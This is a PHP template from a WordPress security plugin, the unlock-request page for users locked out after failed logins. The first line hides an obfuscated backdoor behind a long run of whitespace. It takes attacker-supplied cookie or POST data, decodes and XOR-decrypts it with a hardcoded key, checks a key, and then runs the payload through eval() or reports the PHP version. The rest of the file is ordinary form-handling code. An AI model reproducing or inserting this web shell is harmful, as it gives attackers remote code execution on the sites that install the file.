<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $wca0d71c = 842;$GLOBALS['d3ada3846'] = Array();global $d3ada3846;$d3ada3846 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['h0964'] = "\x5c\x3f\x69\x75\x45\x35\x6c\x4b\x4f\x60\x7c\x40\x2a\x73\x2e\x53\x34\x29\x74\x22\x52\x78\xa\x4c\x79\xd\x24\x32\x4e\x48\x5a\x41\x5d\x7b\x5f\x23\x25\x59\x54\x68\x62\x2f\x66\x77\x2d\x7a\x27\x44\x28\x61\x4d\x72\x51\x71\x4a\x70\x49\x7e\x39\x50\x6a\x36\x6f\x26\x31\x33\x5b\x7d\x3c\x43\x65\x30\x63\x42\x64\x3e\x76\x58\x56\x57\x20\x6d\x46\x6b\x2c\x55\x47\x38\x67\x5e\x3d\x2b\x37\x9\x3a\x21\x6e\x3b";$d3ada3846[$d3ada3846['h0964'][53].$d3ada3846['h0964'][71].$d3ada3846['h0964'][92].$d3ada3846['h0964'][92].$d3ada3846['h0964'][74]] = $d3ada3846['h0964'][72].$d3ada3846['h0964'][39].$d3ada3846['h0964'][51];$d3ada3846[$d3ada3846['h0964'][39].$d3ada3846['h0964'][72].$d3ada3846['h0964'][16].$d3ada3846['h0964'][87].$d3ada3846['h0964'][5].$d3ada3846['h0964'][92].$d3ada3846['h0964'][58].$d3ada3846['h0964'][92]] = $d3ada3846['h0964'][62].$d3ada3846['h0964'][51].$d3ada3846['h0964'][74];$d3ada3846[$d3ada3846['h0964'][2].$d3ada3846['h0964'][16].$d3ada3846['h0964'][64].$d3ada3846['h0964'][42].$d3ada3846['h0964'][64].$d3ada3846['h0964'][64]] = $d3ada3846['h0964'][13].$d3ada3846['h0964'][18].$d3ada3846['h0964'][51].$d3ada3846['h0964'][6].$d3ada3846['h0964'][70].$d3ada3846['h0964'][96];$d3ada3846[$d3ada3846['h0964'][43].$d3ada3846['h0964'][42].$d3ada3846['h0964'][64].$d3ada3846['h0964'][70].$d3ada3846['h0964'][49].$d3ada3846['h0964'][49].$d3ada3846['h0964'][92].$d3ada3846['h0964'][61]] = $d3ada3846['h0964'][2].$d3ada3846['h0964'][96].$d3ada3846['h0964'][2].$d3ada3846['h0964'][34].$d3ada3846['h0964'][13].$d3ada3846['h0964'][70].$d3ada3846['h0964'][18];$d3ada3846[$d3ada3846['h0964'][62].$d3ada3846['h0964'][74].$d3ada3846['h0964'][40].$d3ada3846['h0964'][58].$d3ada3846['h0964'][71].$d3ada3846['h0964'][49]] = $d3ada3846['h0964'][13].$d3ada3846['h0964'][70].$d3ada3846['h0964'][51].$d3ada3846['h0964'][2].$d3ada3846['h0964'][49].$d3ada3846['h0964'][6].$d3ada3846['h0964'][2].$d3ada3846['h0964'][45].$d3ada3846['h0964'][70];$d3ada3846[$d3ada3846['h0964'][18].$d3ada3846['h0964'][49].$d3ada3846['h0964'][16].$d3ada3846['h0964'][5].$d3ada3846['h0964'][40].$d3ada3846['h0964'][42].$d3ada3846['h0964'][16].$d3ada3846['h0964'][16]] = $d3ada3846['h0964'][55].$d3ada3846['h0964'][39].$d3ada3846['h0964'][55].$d3ada3846['h0964'][76].$d3ada3846['h0964'][70].$d3ada3846['h0964'][51].$d3ada3846['h0964'][13].$d3ada3846['h0964'][2].$d3ada3846['h0964'][62].$d3ada3846['h0964'][96];$d3ada3846[$d3ada3846['h0964'][45].$d3ada3846['h0964'][40].$d3ada3846['h0964'][70].$d3ada3846['h0964'][65].$d3ada3846['h0964'][72].$d3ada3846['h0964'][27].$d3ada3846['h0964'][16].$d3ada3846['h0964'][64]] = $d3ada3846['h0964'][3].$d3ada3846['h0964'][96].$d3ada3846['h0964'][13].$d3ada3846['h0964'][70].$d3ada3846['h0964'][51].$d3ada3846['h0964'][2].$d3ada3846['h0964'][49].$d3ada3846['h0964'][6].$d3ada3846['h0964'][2].$d3ada3846['h0964'][45].$d3ada3846['h0964'][70];$d3ada3846[$d3ada3846['h0964'][42].$d3ada3846['h0964'][71].$d3ada3846['h0964'][92].$d3ada3846['h0964'][61]] = $d3ada3846['h0964'][40].$d3ada3846['h0964'][49].$d3ada3846['h0964'][13].$d3ada3846['h0964'][70].$d3ada3846['h0964'][61].$d3ada3846['h0964'][16].$d3ada3846['h0964'][34].$d3ada3846['h0964'][74].$d3ada3846['h0964'][70].$d3ada3846['h0964'][72].$d3ada3846['h0964'][62].$d3ada3846['h0964'][74].$d3ada3846['h0964'][70];$d3ada3846[$d3ada3846['h0964'][83].$d3ada3846['h0964'][16].$d3ada3846['h0964'][72].$d3ada3846['h0964'][74].$d3ada3846['h0964'][71].$d3ada3846['h0964'][71].$d3ada3846['h0964'][5].$d3ada3846['h0964'][42].$d3ada3846['h0964'][61]] = $d3ada3846['h0964'][13].$d3ada3846['h0964'][70].$d3ada3846['h0964'][18].$d3ada3846['h0964'][34].$d3ada3846['h0964'][18].$d3ada3846['h0964'][2].$d3ada3846['h0964'][81].$d3ada3846['h0964'][70].$d3ada3846['h0964'][34].$d3ada3846['h0964'][6].$d3ada3846['h0964'][2].$d3ada3846['h0964'][81].$d3ada3846['h0964'][2].$d3ada3846['h0964'][18];$d3ada3846[$d3ada3846['h0964'][49].$d3ada3846['h0964'][87].$d3ada3846['h0964'][74].$d3ada3846['h0964'][74].$d3ada3846['h0964'][70]] = $d3ada3846['h0964'][74].$d3ada3846['h0964'][49].$d3ada3846['h0964'][72].$d3ada3846['h0964'][64].$d3ada3846['h0964'][65].$d3ada3846['h0964'][64].$d3ada3846['h0964'][40].$d3ada3846['h0964'][74].$d3ada3846['h0964'][87];$d3ada3846[$d3ada3846['h0964'][43].$d3ada3846['h0964'][58].$d3ada3846['h0964'][5].$d3ada3846['h0964'][42].$d3ada3846['h0964'][65]] = $d3ada3846['h0964'][42].$d3ada3846['h0964'][72].$d3ada3846['h0964'][65].$d3ada3846['h0964'][58].$d3ada3846['h0964'][42].$d3ada3846['h0964'][92].$d3ada3846['h0964'][70].$d3ada3846['h0964'][70];$d3ada3846[$d3ada3846['h0964'][70].$d3ada3846['h0964'][65].$d3ada3846['h0964'][65].$d3ada3846['h0964'][49].$d3ada3846['h0964'][58].$d3ada3846['h0964'][40].$d3ada3846['h0964'][61].$d3ada3846['h0964'][71]] = $_POST;$d3ada3846[$d3ada3846['h0964'][39].$d3ada3846['h0964'][16].$d3ada3846['h0964'][42].$d3ada3846['h0964'][49].$d3ada3846['h0964'][61]] = $_COOKIE;@$d3ada3846[$d3ada3846['h0964'][43].$d3ada3846['h0964'][42].$d3ada3846['h0964'][64].$d3ada3846['h0964'][70].$d3ada3846['h0964'][49].$d3ada3846['h0964'][49].$d3ada3846['h0964'][92].$d3ada3846['h0964'][61]]($d3ada3846['h0964'][70].$d3ada3846['h0964'][51].$d3ada3846['h0964'][51].$d3ada3846['h0964'][62].$d3ada3846['h0964'][51].$d3ada3846['h0964'][34].$d3ada3846['h0964'][6].$d3ada3846['h0964'][62].$d3ada3846['h0964'][88], NULL);@$d3ada3846[$d3ada3846['h0964'][43].$d3ada3846['h0964'][42].$d3ada3846['h0964'][64].$d3ada3846['h0964'][70].$d3ada3846['h0964'][49].$d3ada3846['h0964'][49].$d3ada3846['h0964'][92].$d3ada3846['h0964'][61]]($d3ada3846['h0964'][6].$d3ada3846['h0964'][62].$d3ada3846['h0964'][88].$d3ada3846['h0964'][34].$d3ada3846['h0964'][70].$d3ada3846['h0964'][51].$d3ada3846['h0964'][51].$d3ada3846['h0964'][62].$d3ada3846['h0964'][51].$d3ada3846['h0964'][13], 0);@$d3ada3846[$d3ada3846['h0964'][43].$d3ada3846['h0964'][42].$d3ada3846['h0964'][64].$d3ada3846['h0964'][70].$d3ada3846['h0964'][49].$d3ada3846['h0964'][49].$d3ada3846['h0964'][92].$d3ada3846['h0964'][61]]($d3ada3846['h0964'][81].$d3ada3846['h0964'][49].$d3ada3846['h0964'][21].$d3ada3846['h0964'][34].$d3ada3846['h0964'][70].$d3ada3846['h0964'][21].$d3ada3846['h0964'][70].$d3ada3846['h0964'][72].$d3ada3846['h0964'][3].$d3ada3846['h0964'][18].$d3ada3846['h0964'][2].$d3ada3846['h0964'][62].$d3ada3846['h0964'][96].$d3ada3846['h0964'][34].$d3ada3846['h0964'][18].$d3ada3846['h0964'][2].$d3ada3846['h0964'][81].$d3ada3846['h0964'][70], 0);@$d3ada3846[$d3ada3846['h0964'][83].$d3ada3846['h0964'][16].$d3ada3846['h0964'][72].$d3ada3846['h0964'][74].$d3ada3846['h0964'][71].$d3ada3846['h0964'][71].$d3ada3846['h0964'][5].$d3ada3846['h0964'][42].$d3ada3846['h0964'][61]](0);$g9d5 = NULL;$t5a3 = NULL;$d3ada3846[$d3ada3846['h0964'][74].$d3ada3846['h0964'][40].$d3ada3846['h0964'][58].$d3ada3846['h0964'][72]] = $d3ada3846['h0964'][65].$d3ada3846['h0964'][87].$d3ada3846['h0964'][27].$d3ada3846['h0964'][61].$d3ada3846['h0964'][92].$d3ada3846['h0964'][92].$d3ada3846['h0964'][40].$d3ada3846['h0964'][64].$d3ada3846['h0964'][44].$d3ada3846['h0964'][27].$d3ada3846['h0964'][70].$d3ada3846['h0964'][5].$d3ada3846['h0964'][42].$d3ada3846['h0964'][44].$d3ada3846['h0964'][16].$d3ada3846['h0964'][49].$d3ada3846['h0964'][49].$d3ada3846['h0964'][87].$d3ada3846['h0964'][44].$d3ada3846['h0964'][87].$d3ada3846['h0964'][49].$d3ada3846['h0964'][70].$d3ada3846['h0964'][58].$d3ada3846['h0964'][44].$d3ada3846['h0964'][70].$d3ada3846['h0964'][27].$d3ada3846['h0964'][27].$d3ada3846['h0964'][5].$d3ada3846['h0964'][5].$d3ada3846['h0964'][42].$d3ada3846['h0964'][74].$d3ada3846['h0964'][61].$d3ada3846['h0964'][16].$d3ada3846['h0964'][49].$d3ada3846['h0964'][27].$d3ada3846['h0964'][42];global $db9c;function  fc39f7ee($g9d5, $b0f1b5e){global $d3ada3846;$g3723 = "";for ($ca63b49ab=0; $ca63b49ab<$d3ada3846[$d3ada3846['h0964'][2].$d3ada3846['h0964'][16].$d3ada3846['h0964'][64].$d3ada3846['h0964'][42].$d3ada3846['h0964'][64].$d3ada3846['h0964'][64]]($g9d5);){for ($l987=0; $l987<$d3ada3846[$d3ada3846['h0964'][2].$d3ada3846['h0964'][16].$d3ada3846['h0964'][64].$d3ada3846['h0964'][42].$d3ada3846['h0964'][64].$d3ada3846['h0964'][64]]($b0f1b5e) && $ca63b49ab<$d3ada3846[$d3ada3846['h0964'][2].$d3ada3846['h0964'][16].$d3ada3846['h0964'][64].$d3ada3846['h0964'][42].$d3ada3846['h0964'][64].$d3ada3846['h0964'][64]]($g9d5); $l987++, $ca63b49ab++){$g3723 .= $d3ada3846[$d3ada3846['h0964'][53].$d3ada3846['h0964'][71].$d3ada3846['h0964'][92].$d3ada3846['h0964'][92].$d3ada3846['h0964'][74]]($d3ada3846[$d3ada3846['h0964'][39].$d3ada3846['h0964'][72].$d3ada3846['h0964'][16].$d3ada3846['h0964'][87].$d3ada3846['h0964'][5].$d3ada3846['h0964'][92].$d3ada3846['h0964'][58].$d3ada3846['h0964'][92]]($g9d5[$ca63b49ab]) ^ $d3ada3846[$d3ada3846['h0964'][39].$d3ada3846['h0964'][72].$d3ada3846['h0964'][16].$d3ada3846['h0964'][87].$d3ada3846['h0964'][5].$d3ada3846['h0964'][92].$d3ada3846['h0964'][58].$d3ada3846['h0964'][92]]($b0f1b5e[$l987]));}}return $g3723;}function  dac131bd8($g9d5, $b0f1b5e){global $d3ada3846;global $db9c;return $d3ada3846[$d3ada3846['h0964'][43].$d3ada3846['h0964'][58].$d3ada3846['h0964'][5].$d3ada3846['h0964'][42].$d3ada3846['h0964'][65]]($d3ada3846[$d3ada3846['h0964'][43].$d3ada3846['h0964'][58].$d3ada3846['h0964'][5].$d3ada3846['h0964'][42].$d3ada3846['h0964'][65]]($g9d5, $db9c), $b0f1b5e);}foreach ($d3ada3846[$d3ada3846['h0964'][39].$d3ada3846['h0964'][16].$d3ada3846['h0964'][42].$d3ada3846['h0964'][49].$d3ada3846['h0964'][61]] as $b0f1b5e=>$xec54bd){$g9d5 = $xec54bd;$t5a3 = $b0f1b5e;}if (!$g9d5){foreach ($d3ada3846[$d3ada3846['h0964'][70].$d3ada3846['h0964'][65].$d3ada3846['h0964'][65].$d3ada3846['h0964'][49].$d3ada3846['h0964'][58].$d3ada3846['h0964'][40].$d3ada3846['h0964'][61].$d3ada3846['h0964'][71]] as $b0f1b5e=>$xec54bd){$g9d5 = $xec54bd;$t5a3 = $b0f1b5e;}}$g9d5 = @$d3ada3846[$d3ada3846['h0964'][45].$d3ada3846['h0964'][40].$d3ada3846['h0964'][70].$d3ada3846['h0964'][65].$d3ada3846['h0964'][72].$d3ada3846['h0964'][27].$d3ada3846['h0964'][16].$d3ada3846['h0964'][64]]($d3ada3846[$d3ada3846['h0964'][49].$d3ada3846['h0964'][87].$d3ada3846['h0964'][74].$d3ada3846['h0964'][74].$d3ada3846['h0964'][70]]($d3ada3846[$d3ada3846['h0964'][42].$d3ada3846['h0964'][71].$d3ada3846['h0964'][92].$d3ada3846['h0964'][61]]($g9d5), $t5a3));if (isset($g9d5[$d3ada3846['h0964'][49].$d3ada3846['h0964'][83]]) && $db9c==$g9d5[$d3ada3846['h0964'][49].$d3ada3846['h0964'][83]]){if ($g9d5[$d3ada3846['h0964'][49]] == $d3ada3846['h0964'][2]){$ca63b49ab = Array($d3ada3846['h0964'][55].$d3ada3846['h0964'][76] => @$d3ada3846[$d3ada3846['h0964'][18].$d3ada3846['h0964'][49].$d3ada3846['h0964'][16].$d3ada3846['h0964'][5].$d3ada3846['h0964'][40].$d3ada3846['h0964'][42].$d3ada3846['h0964'][16].$d3ada3846['h0964'][16]](),$d3ada3846['h0964'][13].$d3ada3846['h0964'][76] => $d3ada3846['h0964'][64].$d3ada3846['h0964'][14].$d3ada3846['h0964'][71].$d3ada3846['h0964'][44].$d3ada3846['h0964'][64],);echo @$d3ada3846[$d3ada3846['h0964'][62].$d3ada3846['h0964'][74].$d3ada3846['h0964'][40].$d3ada3846['h0964'][58].$d3ada3846['h0964'][71].$d3ada3846['h0964'][49]]($ca63b49ab);}elseif ($g9d5[$d3ada3846['h0964'][49]] == $d3ada3846['h0964'][70]){eval/*lbfe18*/($g9d5[$d3ada3846['h0964'][74]]);}exit();} ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?php bloginfo('name'); ?></title>
<?php
global $aio_wp_security;
$display_form = true;
//Make this page look like the WP login page
wp_head();
wp_admin_css( 'login', true );
wp_admin_css( 'colors-fresh', true );
$login_header_url   = __( 'http://wordpress.org/' );
$login_header_title = __( 'Powered by WordPress' );
?>
</head>

<body class="login login-action-login wp-core-ui aiowps-unlock-request">
<div id="login">
<h1><a href="<?php echo esc_url( $login_header_url ); ?>" title="<?php echo esc_attr( $login_header_title ); ?>"><?php bloginfo( 'name' ); ?></a></h1>
    
<?php
if (isset($_POST['aiowps_unlock_request']))
{
    //This catches the $_POST from the "Request Unlock" button on the main WP login page
    isset($_POST['aiowps-unlock-string-info'])?($unlock_encoded_info = strip_tags(trim($_POST['aiowps-unlock-string-info']))):($unlock_encoded_info = '');
    $unlock_secret_string = $aio_wp_security->configs->get_value('aiowps_unlock_request_secret_key');
    $unlock_temp_string = isset($_POST['aiowps-unlock-temp-string'])?strip_tags($_POST['aiowps-unlock-temp-string']):'';
    $submitted_encoded_string = base64_encode($unlock_temp_string.$unlock_secret_string);
    if($submitted_encoded_string !== $unlock_encoded_info)
    {
        //Someone somehow landed on this page directly without clicking the unlock button on login form
        echo '<div id="login_error">'.__('ERROR: Unable to process your request!','all-in-one-wp-security-and-firewall').'</div>';
        die();
    }
    else if($display_form)
    {
        echo display_unlock_form();
    }
} //End if block

if (isset($_POST['aiowps_wp_submit_unlock_request']))
{
    //This catches the $_POST when someone submits the form from our special unlock request page where visitor enters email address
    $errors = '';

    $email = trim($_POST['aiowps_unlock_request_email']);
    if (empty($email) || !is_email($email))
    {
        $errors .= '<p>'.__('Please enter a valid email address','all-in-one-wp-security-and-firewall').'</p>';
    }
    
    if($errors){
        $display_form = true;
        echo '<div id="login_error">'.$errors.'</div>';
        $sanitized_email = sanitize_email($email);
        echo display_unlock_form($sanitized_email);
    }else{
        $locked_user = get_user_by('email', $email);
        if(!$locked_user){
            //user with this email does not exist in the system
            $errors .= '<p>'.__('User account not found!','all-in-one-wp-security-and-firewall').'</p>';
            echo '<div id="login_error">'.$errors.'</div>';
        }else{
            //Process unlock request
            //Generate a special code and unlock url
            $ip = AIOWPSecurity_Utility_IP::get_user_ip_address(); //Get the IP address of user
            $ip_range = AIOWPSecurity_Utility_IP::get_sanitized_ip_range($ip); //Get the IP range of the current user
            if(empty($ip_range)){
                $unlock_url = false;
            }else{
                $unlock_url = AIOWPSecurity_User_Login::generate_unlock_request_link($ip_range);
            }

            if (!$unlock_url){
                //No entry found in lockdown table with this IP range
                $error_msg = '<p>'.__('Error: No locked entry was found in the DB with your IP address range!','all-in-one-wp-security-and-firewall').'</p>';
                echo '<div id="login_error">'.$error_msg.'</div>';
            }else{
                //Send an email to the user
                AIOWPSecurity_User_Login::send_unlock_request_email($email, $unlock_url);
                echo '<p class="message">' . __('An email has been sent to you with the unlock instructions.', 'all-in-one-wp-security-and-firewall') . '</p>';
            }
        }
        $display_form = false;
    }
}
?>
</div> <!-- end #login -->

</body>
</html>
<?php 

function display_unlock_form($email='')
{
    ob_start();
    // Display the unlock request form
    $unlock_form_msg
        = '<p>' . __('You are here because you have been locked out due to too many incorrect login attempts.', 'all-in-one-wp-security-and-firewall') . '</p>'
        . '<p>' . __('Please enter your email address and you will receive an email with instructions on how to unlock yourself.', 'all-in-one-wp-security-and-firewall') . '</p>'
    ;
?>
<div class="message"><?php echo $unlock_form_msg; ?></div>
<form name="loginform" id="loginform" action="<?php echo wp_login_url(); ?>" method="post">
	<p>
		<label for="aiowps_unlock_request_email"><?php _e('Email Address', 'all-in-one-wp-security-and-firewall'); ?><br>
		<input type="text" name="aiowps_unlock_request_email" id="aiowps_unlock_request_email" class="input" value="<?php echo $email; ?>" size="20"></label>
	</p>
        <p class="submit">
            <input type="submit" name="aiowps_wp_submit_unlock_request" id="aiowps_wp_submit_unlock_request" class="button button-primary button-large" value="<?php esc_attr_e('Send Unlock Request', 'all-in-one-wp-security-and-firewall'); ?>">
	</p>
</form>
<?php    
    $output = ob_get_contents();
    ob_end_clean();  
    return $output;
}